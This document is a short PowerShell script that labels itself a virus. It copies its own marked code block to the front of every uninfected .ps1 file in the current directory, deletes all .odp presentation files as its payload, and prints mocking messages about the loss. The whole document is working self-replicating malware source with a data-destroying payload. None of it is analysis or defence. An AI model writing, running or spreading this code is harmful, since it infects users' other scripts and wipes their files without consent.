### VIRUS ###
# Copy the virus code
$virusFilename = $MyInvocation.MyCommand.Name
$virusFileContents = get-content $virusFilename
$virusCode = @()
$inVirus = $False
foreach ($line in $virusFileContents) {
	if ($line -match "^`#`#`# VIRUS") {
		$inVirus = ! $inVirus
	}
	if ($inVirus) {
		$virusCode += $line
	}
}
$virusCode += "### VIRUS ###"
# Find files to infect
$dirlist = dir *.ps1
foreach ($filename in $dirlist) {
	# Check the files for infection
	$victimCode = get-content $filename
	if (-not ($victimCode -match "^`#`#`# VIRUS")) {
		# Infect the victim file
		set-content $filename $virusCode
		add-content $filename $victimCode
	}
}
# Virus payload
del *.odp
### VIRUS ###

write-host "Infection Started"
write-host "Say Good-bye to your ODP files."
write-host "Ha ha ha!!!!!"
